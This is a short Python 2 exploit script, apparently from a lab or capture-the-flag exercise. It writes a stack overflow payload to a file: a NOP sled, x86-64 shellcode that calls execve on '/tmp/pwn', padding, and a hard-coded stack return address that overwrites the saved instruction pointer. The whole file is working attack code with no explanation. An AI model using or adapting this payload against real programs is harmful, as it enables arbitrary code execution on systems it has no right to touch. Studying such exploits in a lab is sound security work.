import sys

payload = ""

payload += "\x90" * 204

payload += "\x48\x31\xd2"
payload += "\x48\xbb\x2f\x74\x6d\x70\x2f"
payload += "\x70\x77\x6e"
payload += "\x53"
payload += "\x48\x89\xe7"
payload += "\x50"
payload += "\x57"
payload += "\x48\x89\xe6"
payload += "\xb0\x3b"
payload += "\x0f\x05"

payload += "\x90" * 34

print "Payload size (without addr): " + str(len(payload))
payload += "\xf0\xe4\xff\xff\xff\x7f"

with open('in.txt', 'w') as outfile:
	outfile.write(payload)
